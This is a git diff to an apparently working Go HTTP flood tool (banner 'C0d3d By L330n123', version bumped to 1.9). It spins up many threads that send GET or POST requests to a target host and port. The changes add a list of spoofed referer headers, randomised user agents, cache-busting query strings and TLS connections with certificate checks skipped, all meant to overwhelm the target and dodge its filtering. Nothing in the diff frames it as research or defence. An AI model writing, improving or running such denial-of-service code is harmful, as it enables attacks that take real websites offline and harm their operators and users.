@@ -20,7 +20,6 @@ import (
 )
 
 var (
-	useragent []string
 	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
 	start     = make(chan bool)
 	acceptall = []string{
@@ -54,6 +53,22 @@ var (
 		"Googlebot-Image/1.0",
 		"Googlebot-News",
 		"Googlebot-Video/1.0",
+	}
+	referers = []string{
+		"https://www.google.com/search?q=",
+		"https://check-host.net/",
+		"https://www.facebook.com/",
+		"https://www.youtube.com/",
+		"https://www.fbi.com/",
+		"https://www.bing.com/search?q=",
+		"https://r.search.yahoo.com/",
+		"https://www.cia.gov/index.html",
+		"https://vk.com/profile.php?auto=",
+		"https://www.usatoday.com/search/results?q=",
+		"https://help.baidu.com/searchResult?keywords=",
+		"https://steamcommunity.com/market/search?q=",
+		"https://www.ted.com/search?q=",
+		"https://play.google.com/store/search?q=",
 	}
 )
 
@@ -90,11 +105,6 @@ func getuseragent() string {
 	}
 	return spider[rand.Intn(len(spider))]
 }
-func generate_ua(threads int) {
-	for i := 0; i < threads; i++ {
-		useragent = append(useragent, getuseragent())
-	}
-}
 
 func contain(char string, x string) int { //simple compare
 	times := 0
@@ -108,18 +118,17 @@ func contain(char string, x string) int { //simple compare
 	return ans
 }
 
-func flood() {
-	addr := os.Args[1]
-	addr += ":"
-	addr += os.Args[2]
+func flood(ip, port, page, mode string) {
+	addr := ip + ":" + port
 	header := ""
-	if os.Args[5] == "get" {
+	if mode == "get" {
 		header += " HTTP/1.1\r\nHost: "
 		header += addr + "\r\n"
 		if os.Args[7] == "nil" {
 			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
-			header += "User-Agent: " + useragent[rand.Intn(len(useragent))] + "\r\n"
+			header += "User-Agent: " + getuseragent() + "\r\n"
 			header += acceptall[rand.Intn(len(acceptall))]
+			header += referers[rand.Intn(len(referers))]
 		} else {
 			fi, err := os.Open(os.Args[7])
 			if err != nil {
@@ -136,7 +145,7 @@ func flood() {
 				header += string(a) + "\r\n"
 			}
 		}
-	} else if os.Args[5] == "post" {
+	} else if mode == "post" {
 		data := ""
 		if os.Args[7] != "nil" {
 			fi, err := os.Open(os.Args[7])
@@ -161,16 +170,16 @@ func flood() {
 		}
 		header := "POST " + os.Args[4] + " HTTP/1.1\r\nHost: " + addr + "\r\n"
 		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
-		header += "Accept-Encoding: gzip, deflate\r\n\n" + data
+		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
 	}
 	var s net.Conn
 	var err error
 	<-start //received signal
 	for {
-		if os.Args[2] == "443" {
+		if port == "443" {
 			cfg := &tls.Config{
 				InsecureSkipVerify: true,
-				ServerName:         os.Args[1], //simple fix
+				ServerName:         ip, //simple fix
 			}
 			s, err = tls.Dial("tcp", addr, cfg)
 		} else {
@@ -185,13 +194,11 @@ func flood() {
 					request += "GET " + os.Args[4] + page
 					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
 				}
-				request += header + "\r\n\r\n"
+				request += header + "\r\n"
 				s.Write([]byte(request))
-				//time.Sleep(time.Millisecond * 200)//Sent delay can reduce i/o usage
 			}
 			s.Close()
 		}
-		//time.Sleep(time.Second * 1)
 		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
 	}
 }
@@ -203,7 +210,7 @@ func main() {
 	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
 	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
 	fmt.Println("                          ||                                             ")
-	fmt.Println("                         .||                     Golang version 1.8      ")
+	fmt.Println("                         .||                     Golang version 1.9      ")
 	fmt.Println("                                                        C0d3d By L330n123")
 	fmt.Println("==========================================================================")
 	if len(os.Args) != 8 {
@@ -225,12 +232,11 @@ func main() {
 	} else {
 		page = "&"
 	}
-	generate_ua(threads)
 	input := bufio.NewReader(os.Stdin)
 
 	for i := 0; i < threads; i++ {
 		time.Sleep(time.Microsecond * 100)
-		go flood() // Start threads
+		go flood(os.Args[1], os.Args[2], os.Args[4], os.Args[5]) // Start threads
 		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
